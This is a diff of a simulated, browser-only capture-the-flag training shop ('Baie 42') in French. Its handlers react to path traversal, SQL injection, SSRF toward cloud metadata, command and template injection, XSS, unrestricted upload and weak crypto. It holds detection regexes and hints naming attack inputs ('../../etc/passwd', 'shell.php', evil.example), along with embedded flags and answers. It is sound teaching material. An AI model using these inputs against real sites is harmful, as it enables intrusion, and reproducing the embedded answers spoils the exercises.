+      markFound("f13");msg.innerHTML=`<div class="notice ok">Le chemin n'est pas filtre : <code>${esc(name)}</code> remonte hors du dossier des factures et lit un fichier systeme (traversee de chemin). Contenu : <span class="flag">${esc(F("f13"))}</span></div>`;}
+    else if(/\.\.(\/|\\)/.test(name)){msg.innerHTML=`<div class="notice">Chemin remonte detecte, mais ce fichier n'existe pas. Vise un fichier systeme sensible (ex. ../../etc/passwd).</div>`;}
+    else msg.innerHTML=`<div class="notice">Telechargement de <code>${esc(name)}</code> (simule).</div>`;
+  }
+});
+app.addEventListener("input",e=>{
+  const q=e.target.closest("[data-qty]");
+  if(q){cart[parseInt(q.dataset.qty,10)].qty=parseInt(q.value,10)||0;saveCart();const t=document.getElementById("total");if(t)t.textContent=eur(cartSub()*(1-promoRate))}
+  if(e.target.id==="lu"||e.target.id==="lp"){const u=document.getElementById("lu").value,p=document.getElementById("lp").value;document.getElementById("sqlDebug").textContent=`SELECT * FROM utilisateurs WHERE login='${u}' AND mdp='${p}'`}
+  if(e.target.id==="shopSearch"){shopQuery=e.target.value;const g=app.querySelector(".grid");if(g){const qq=shopQuery.trim().toLowerCase();const lst=PRODUCTS.filter(p=>!p.hidden&&(shopFilter==="Tous"||p.cat===shopFilter)&&(!qq||(p.name+" "+p.cat+" "+p.desc).toLowerCase().includes(qq)));g.innerHTML=lst.map(card).join("")||"<p>Aucun produit ne correspond.</p>"}}
+});
+app.addEventListener("toggle",e=>{
+  const d=e.target;
+  if(d&&d.classList&&d.classList.contains("hint")&&d.open&&d.dataset.ch){
+    const id=d.dataset.ch;
+    if(!hintsUsed().includes(id)){
+      useHint(id);
+      const ch=CHALLENGES.find(c=>c.id===id),pts=Math.ceil(ch.pts*0.3);
+      const sm=d.querySelector("summary");if(sm)sm.textContent="Indice (utilise, -"+pts+" pts)";
+      const f=found(),base=CHALLENGES.filter(c=>f.includes(c.id)).reduce((a,c)=>a+c.pts,0),net=base-hintPenalty();
+      const sc=app.querySelector(".score");if(sc&&sc.childNodes[0])sc.childNodes[0].nodeValue=String(net);
+    }
+  }
+},true);
+app.addEventListener("submit",e=>{
+  e.preventDefault();const id=e.target.id;
+
+  if(id==="offerForm"){
+    const pid=parseInt(e.target.dataset.pid,10),p=byId(pid),prix=parseFloat(document.getElementById("offer").value),m=document.getElementById("offerMsg");
+    if(isNaN(prix)||prix<0){m.innerHTML=`<div class="notice err">Prix invalide.</div>`;return}
+    const l=cart.find(x=>x.id===pid);if(l){l.qty+=1;l.prix=prix}else cart.push({id:pid,qty:1,prix:prix});saveCart();
+    if(prix<p.price*0.5){markFound("a1");m.innerHTML=`<div class="notice ok">Offre a ${eur(prix)} acceptee : le panier garde le prix que TU envoies (parameter tampering). Flag : <span class="flag">${esc(F("a1"))}</span></div>`}
+    else m.innerHTML=`<div class="notice ok">Prix de ${eur(prix)} enregistre dans le panier. Et si tu proposais beaucoup moins ?</div>`;
+    return;}
+
+  if(id==="profilForm"){
+    const m=document.getElementById("profilMsg");let extra={};
+    try{extra=JSON.parse(document.getElementById("pextra").value||"{}")}catch(err){m.innerHTML=`<div class="notice err">JSON invalide.</div>`;return}
+    const s=getSession()||{user:"guest",role:"client"};
+    Object.assign(s,{user:document.getElementById("pnom").value||s.user},extra); // mass assignment : tout est applique
+    setSession(s);
+    if("credit" in extra||"role" in extra){markFound("a4");m.innerHTML=`<div class="notice ok">Le serveur a applique TOUS les champs envoyes, dont ${esc(Object.keys(extra).join(", "))} (mass assignment). Nouveau profil : role=${esc(s.role)}, credit=${esc(String(s.credit||0))} €. Flag : <span class="flag">${esc(F("a4"))}</span></div>`;updateBadges()}
+    else m.innerHTML=`<div class="notice ok">Profil enregistre. Indice : ajoute un champ comme <code>{"credit": 9999}</code>.</div>`;
+    return;}
+
+  if(id==="loginForm"){
+    const u=document.getElementById("lu").value,p=document.getElementById("lp").value,msg=document.getElementById("loginMsg");
+    const inj=/'\s*(or|\|\|)\s*('?[\w ]*'?\s*=\s*'?[\w ]*'?|true|\d)|'\s*(--|#|\/\*)/i;
+    if(inj.test(u)||inj.test(p)){setSession({user:"support",role:"support"});markFound("f5");msg.innerHTML=`<div class="notice ok">La condition WHERE est toujours vraie : la base renvoie le premier compte ("support"). Flag : <span class="flag">${esc(F("f5"))}</span></div>`;updateBadges();return;}
+    if(u==="guest"&&p==="guest"){setSession({user:"guest",role:"client"});route();return}
+    if(u==="admin"&&md5(p)===md5("jardin")){setSession({user:"admin",role:"admin"});sSet("baie42_login_fail","0");msg.innerHTML=`<div class="notice ok">Connecte en tant qu'admin. Tu peux ouvrir le <a href="#admin">panneau d'administration</a>.</div>`;updateBadges();return}
+    const fails=(parseInt(sGet("baie42_login_fail","0"),10)||0)+1;sSet("baie42_login_fail",String(fails));
+    if(fails>=10){markFound("w5");msg.innerHTML=`<div class="notice ok">${fails} tentatives echouees, toujours aucun blocage ni delai : le formulaire est brute-forcable. Flag : <span class="flag">${esc(F("w5"))}</span></div>`}
+    else msg.innerHTML=`<div class="notice err">Identifiant ou mot de passe incorrect. (tentative ${fails}, aucune limite configuree)</div>`;
+    return;}
+
+  if(id==="promoteForm"){
+    const who=document.getElementById("promoteUser").value||"guest",m=document.getElementById("promoteMsg");
+    markFound("w1");m.innerHTML=`<div class="notice ok">Compte "${esc(who)}" promu admin via une requete GET sans jeton anti-CSRF : un lien piege aurait fait pareil a l'insu de l'admin. Flag : <span class="flag">${esc(F("w1"))}</span></div>`;return;}
+
+  if(id==="ssrfForm"){
+    const url=(document.getElementById("ssrfUrl").value||"").trim(),out=document.getElementById("ssrfOut");
+    if(/169\.254\.169\.254|localhost|127\.0\.0\.1|\[::1\]|0\.0\.0\.0|10\.|192\.168\.|internal|metadata/i.test(url)){
+      markFound("w2");out.innerHTML=`$ curl ${esc(url)}\niam-role: baie42-prod\n<span class="c-y">secret-access-key: ${esc(F("w2"))}</span>\n(le serveur a requete une ressource interne : SSRF)`;}
+    else out.textContent=`$ curl ${url}\nHTTP/1.1 200 OK\n{"status":"ok"}  (hote externe, rien d'interessant — vise une ressource interne)`;
+    return;}
+
+  if(id==="uploadForm"){
+    const name=(document.getElementById("upName").value||"").trim(),m=document.getElementById("upMsg");
+    if(/\.(php|phtml|jsp|asp|aspx|sh|exe|svg|html?)$/i.test(name)){
+      markFound("w4");m.innerHTML=`<div class="notice ok">Fichier "${esc(name)}" accepte sans filtrage d'extension ni de type : un fichier executable passe. Flag : <span class="flag">${esc(F("w4"))}</span></div>`;}
+    else m.innerHTML=`<div class="notice">Fichier "${esc(name)}" importe. Essaie une extension dangereuse (ex. shell.php) : rien ne la bloque.</div>`;
+    return;}
+
+  if(id==="redirForm"){
+    const u=(document.getElementById("redirUrl").value||"").trim(),m=document.getElementById("redirMsg");
+    if(/^https?:\/\//i.test(u)||/^\/\//.test(u)){
+      markFound("w3");m.innerHTML=`<div class="notice ok">Le site s'appretait a te rediriger vers <code>${esc(u)}</code>, une destination externe, sans la verifier (open redirect — ideal pour du hameconnage). Flag : <span class="flag">${esc(F("w3"))}</span></div>`;}
+    else m.innerHTML=`<div class="notice">Redirection vers <code>${esc(u)}</code> (chemin interne). Essaie une URL absolue comme https://evil.example.</div>`;
+    return;}
+
+  if(id==="reviewForm"){
+    const pid=parseInt(location.hash.split("-")[1],10),n=document.getElementById("rn").value.trim()||"Anonyme",t=document.getElementById("rt").value.trim(),msg=document.getElementById("reviewMsg");
+    if(!t){msg.innerHTML=`<div class="notice err">Ecris ton avis avant de le publier.</div>`;return}
+    const xss=/<\s*script|on[a-z]+\s*=|javascript\s*:|<\s*(img|svg|iframe)[^>]*>/i;
+    const list=JSON.parse(sGet("baie42_reviews_"+pid,"[]")||"[]");list.push({n,t});sSet("baie42_reviews_"+pid,JSON.stringify(list));route();
+    if(xss.test(n)||xss.test(t)){markFound("f8");document.getElementById("reviewMsg").innerHTML=`<div class="notice ok">Avis publie sans filtrage : sur le vrai site, ce code s'executerait chez chaque visiteur. Flag : <span class="flag">${esc(F("f8"))}</span></div>`}
+    else document.getElementById("reviewMsg").innerHTML=`<div class="notice ok">Avis publie.</div>`;return;}
+
+  if(id==="jwtForm"){
+    const u=document.getElementById("ju").value||"guest";
+    const head=btoa(JSON.stringify({alg:"HS256",typ:"JWT"})).replace(/=/g,"").replace(/\+/g,"-").replace(/\//g,"_");
+    const body=btoa(JSON.stringify({user:u,role:"client",iat:1794614400})).replace(/=/g,"").replace(/\+/g,"-").replace(/\//g,"_");
+    const tok=head+"."+body+".dG9rZW4tc2lnbmUtcGFyLWxlLXNlcnZldXI";
+    sSet("baie42_jwt",tok);document.getElementById("jwtOut").textContent=tok;return;}
+
+  if(id==="pingForm"){
+    const host=document.getElementById("ph").value||"",out=document.getElementById("pingOut");
+    if(/[;&|`]|\$\(/.test(host)){markFound("f12");out.textContent=`$ ping -c1 ${host}\nPING... 1 paquet transmis\n--- commande injectee executee ---\n`+F("f12");}
+    else out.textContent=`$ ping -c1 ${host}\n64 bytes from ${host}: temps=0.4 ms\n1 paquet transmis, 1 recu, 0% perte`;
+    return;}
+
+  if(id==="tplForm"){
+    const tpl=document.getElementById("tn").value||"",out=document.getElementById("tplOut");
+    const mult=/\{\{\s*(\d+)\s*\*\s*(\d+)\s*\}\}/.exec(tpl);
+    if(/\{\{.*(config|self|request|classe|class|globals).*\}\}/i.test(tpl)){markFound("f14");out.textContent="config = { SECRET_KEY: '"+F("f14")+"' }";}
+    else if(mult){out.textContent=tpl.replace(mult[0],String(parseInt(mult[1])*parseInt(mult[2])))+"\n(le gabarit evalue l'expression : essaie maintenant d'atteindre la config de l'application)";}
+    else out.textContent=tpl.replace(/\{\{\s*client\s*\}\}/g,"Dupont");
+    return;}
+
+  if(id==="pinForm"){
+    const pin=(document.getElementById("pin").value||"").trim(),msg=document.getElementById("pinMsg");
+    const tries=(parseInt(sGet("baie42_pin_tries","0"),10)||0)+1;sSet("baie42_pin_tries",String(tries));
+    document.getElementById("pinTries").textContent=`${tries} essai${tries>1?"s":""} — aucune limite configuree.`;
+    if(pin===F("pin")){markFound("f20");markFound("f9");msg.innerHTML=`<div class="notice ok">PIN correct. Avec l'escalade de role, tu accedes au tableau direction. Deux flags : <span class="flag">${esc(F("f20"))}</span> et <span class="flag">${esc(F("f9"))}</span></div>`;}
+    else msg.innerHTML=`<div class="notice err">PIN incorrect. (Rien ne t'empeche de reessayer en boucle : 10000 combinaisons.)</div>`;
+    return;}
+
+  if(id==="md5Form"){
+    const v=document.getElementById("md5in").value||"",msg=document.getElementById("md5Msg");
+    if(md5(v)===md5("jardin")){markFound("f15");msg.innerHTML=`<div class="notice ok">Empreinte retrouvee : le mot de passe est "${esc(v)}". MD5 sans sel tombe au dictionnaire. Flag : <span class="flag">${esc(F("f15"))}</span></div>`}
+    else msg.innerHTML=`<div class="notice err">md5("${esc(v)}") ne correspond pas. Essaie un mot courant en rapport avec un extérieur vert.</div>`;
+    return;}
+
+  if(id==="resetForm"){
+    const v=(document.getElementById("resetin").value||"").trim(),msg=document.getElementById("resetMsg");
+    let dec="";try{dec=atob(v)}catch(e){}
+    if(/^admin:\d{4}-\d{2}$/.test(dec)){markFound("f16");msg.innerHTML=`<div class="notice ok">Jeton de reset admin forge (${esc(dec)}) : il etait entierement previsible. Flag : <span class="flag">${esc(F("f16"))}</span></div>`}
+    else msg.innerHTML=`<div class="notice err">Ce jeton ne correspond pas. Rappel : base64 de "admin:ANNEE-MOIS".</div>`;
+    return;}
+
+  if(id==="rotForm"){
+    const v=(document.getElementById("rotin").value||"").trim().toUpperCase(),msg=document.getElementById("rotMsg");
+    if(v==="VIPLATECH30"){msg.innerHTML=`<div class="notice ok">Code dechiffre : <code>VIPLATECH30</code>. Entre-le dans le <a href="#panier">panier</a> pour valider le flag.</div>`}
+    else msg.innerHTML=`<div class="notice err">Pas encore. Decale chaque lettre de 13 (ROT13).</div>`;
+    return;}
+
+  if(id==="vigForm"){
+    const v=(document.getElementById("vigIn").value||"").trim(),m=document.getElementById("vigMsg");
+    if(v===F("cry1")){markFound("cry1");m.innerHTML=`<div class="notice ok">Vigenere dechiffre avec la cle BAIE. <span class="flag">${esc(F("cry1"))}</span></div>`}
+    else m.innerHTML=`<div class="notice err">Pas encore. Soustrais la cle BAIE (repetee) a chaque lettre.</div>`;return;}
+
+  if(id==="xorForm"){
+    const v=(document.getElementById("xorIn").value||"").trim(),m=document.getElementById("xorMsg");
+    if(v===F("cry2")){markFound("cry2");m.innerHTML=`<div class="notice ok">XOR casse avec la cle 'cle'. <span class="flag">${esc(F("cry2"))}</span></div>`}
+    else m.innerHTML=`<div class="notice err">Pas encore. XOR chaque octet hex avec c,l,e (repetee).</div>`;return;}
+
+  if(id==="rsaForm"){
+    const p=parseInt(document.getElementById("rsaP").value,10),q=parseInt(document.getElementById("rsaQ").value,10),m=document.getElementById("rsaMsg");
+    if(p*q===25777&&((p===149&&q===173)||(p===173&&q===149))){markFound("cry3");m.innerHTML=`<div class="notice ok">Module factorise : 25777 = 149 x 173. RSA casse (n trop petit). Flag : <span class="flag">${esc(F("cry3"))}</span></div>`}
+    else m.innerHTML=`<div class="notice err">p x q doit valoir 25777 avec deux premiers. Reessaie.</div>`;return;}
+
+  if(id==="revStrForm"){
+    const v=(document.getElementById("revStr").value||"").trim(),m=document.getElementById("revStrMsg");
+    if(v===F("rev1")){markFound("rev1");m.innerHTML=`<div class="notice ok">Chaine deobfusquee : les octets hex donnent le flag. <span class="flag">${esc(F("rev1"))}</span></div>`}
+    else m.innerHTML=`<div class="notice err">Pas encore. Convertis chaque \\xNN en caractere ASCII (43=C, 54=T...).</div>`;
+    return;}
+
+  if(id==="revCrackForm"){
+    const p=document.getElementById("revPwd").value||"",m=document.getElementById("revCrackMsg");
+    const cle=[13,37,9,42,18,55,3],cible=[127,22,127,25,96,68,48];
+    let ok=p.length===cle.length;for(let i=0;i<cle.length&&ok;i++)if((p.charCodeAt(i)^cle[i])!==cible[i])ok=false;
+    if(ok){markFound("rev2");m.innerHTML=`<div class="notice ok">Mot de passe correct : tu as inverse le XOR. Flag : <span class="flag">${esc(F("rev2"))}</span></div>`}
+    else m.innerHTML=`<div class="notice err">Refuse. Calcule motdepasse[i] = cible[i] XOR cle[i] pour chaque position.</div>`;
+    return;}
+
+  if(id==="dnsForm"){
+    const v=(document.getElementById("dnsIn").value||"").trim(),m=document.getElementById("dnsMsg");
+    if(v===F("net2")){markFound("net2");m.innerHTML=`<div class="notice ok">Exfiltration reassemblee : les sous-domaines hex donnent le flag. <span class="flag">${esc(F("net2"))}</span></div>`}
+    else m.innerHTML=`<div class="notice err">Pas encore. Concatene les labels hex (4354467b...) et convertis en ASCII.</div>`;
+    return;}
+
+  if(id==="flagForm"){
+    const v=document.getElementById("fi").value.trim(),msg=document.getElementById("flagMsg");
+    const hit=CHALLENGES.find(c=>F(c.id)===v||F(c.id).toLowerCase()===v.toLowerCase());
+    if(hit){const already=found().includes(hit.id);markFound(hit.id);route();document.getElementById("flagMsg").innerHTML=`<div class="notice ok">${already?"Deja valide":"Flag valide"} : ${esc(hit.name)} (+${hit.pts} pts).</div>`}
+    else msg.innerHTML=`<div class="notice err">Ce flag ne correspond a aucune epreuve. Verifie le format CTF{...}.</div>`;
+    return;}
+});
+
+/* message console (defi f19) */
+try{
+  console.log("%cBaie 42 — zone technique","font-size:16px;font-weight:bold;color:#E39B12");
+  console.log("Note equipe : pensez a retirer ce log de debug. Flag : "+F("f19"));
+  console.log("Indice livraison : message en chiffre de Cesar (decalage 7) -> "+ (function(){function c(s,k){return s.replace(/[a-z]/gi,ch=>{const b=ch<="Z"?65:97;return String.fromCharCode((ch.charCodeAt(0)-b+k)%26+b)})}return c("Bravo, voici le flag : "+F("f18"),7)})());
+}catch(e){}
+
+/* memo laisse dans le stockage local (defi g7) */
+try{if(!localStorage.getItem("baie42_memo"))localStorage.setItem("baie42_memo","rappel equipe: flag de recette CTF{l0c4lst0r4g3_0uv3rt} a retirer avant prod")}catch(e){}
+
+/* chrono vivant sur la page Flags */
+setInterval(()=>{const c=document.getElementById("chrono");if(c){const st=parseInt(c.dataset.start||"0",10);if(st)c.textContent=fmtTime(Date.now()-st)}},1000);
+
+/* theme clair / sombre */
+function applyTheme(t){if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);else document.documentElement.removeAttribute("data-theme")}
+applyTheme(sGet("baie42_theme","auto"));
+document.getElementById("themeToggle").addEventListener("click",()=>{
+  const cur=sGet("baie42_theme","auto");
+  const isDark=document.documentElement.getAttribute("data-theme")==="dark"||(cur==="auto"&&matchMedia("(prefers-color-scheme: dark)").matches);
+  const next=isDark?"light":"dark";sSet("baie42_theme",next);applyTheme(next);
+});
+
+route();
+})();
+</script>
+</body>
+</html>
